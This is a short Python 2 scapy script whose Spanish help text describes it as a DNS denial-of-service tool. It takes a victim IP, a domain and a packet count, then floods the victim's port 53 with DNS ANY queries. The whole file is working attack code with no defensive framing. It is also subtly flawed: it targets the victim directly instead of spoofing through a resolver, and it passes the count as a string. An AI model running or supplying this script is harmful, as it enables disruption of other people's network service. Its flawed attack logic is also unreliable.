#!/usr/bin/python

from scapy.all import *

import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para hacer ataque Dos por DNS")
parser.add_argument('-V', '--Victim',metavar="MUSER", help="IP de la victima", required=True, dest='USER')
parser.add_argument('-D', '--DNS', metavar="DNS_TARGET",help="Dominio DNS a consultar",default="www.google.com",  required=True,dest='DNS')
parser.add_argument('-n', '--NUM', metavar="ITERATIONS", help="Numero de paquetes a enviar" , required=True, dest='NUM')
args = parser.parse_args()


dnsqr = DNSQR(qname=args.DNS, qtype=255)

dns = DNS(rd=1,qdcount=1, qd=dnsqr)

request = send(IP(dst=args.USER)/UDP(dport=53)/dns, count=args.NUM)



print 'Iniciando Dos Dns a ip' + args.USER 
